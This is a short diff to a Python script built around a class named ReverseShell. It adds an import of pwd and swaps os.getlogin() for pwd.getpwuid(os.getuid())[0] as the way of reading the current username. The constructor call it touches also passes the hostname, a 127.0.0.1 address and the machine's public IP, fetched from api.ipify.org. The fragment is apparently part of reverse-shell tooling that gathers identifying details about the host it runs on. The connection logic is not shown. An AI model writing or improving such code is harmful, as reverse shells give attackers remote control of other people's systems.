@@ -7,6 +7,7 @@ try:
     import requests
     import socket
     import time
+    import pwd
     import os
 
 except ImportError:
@@ -95,7 +96,7 @@ if __name__ == "__main__":
 
     try:
         remote_connection = ReverseShell(
-            os.getlogin(),
+            pwd.getpwuid(os.getuid())[0],
             socket.gethostname(),
             "127.0.0.1",
             requests.get('https://api.ipify.org').text,
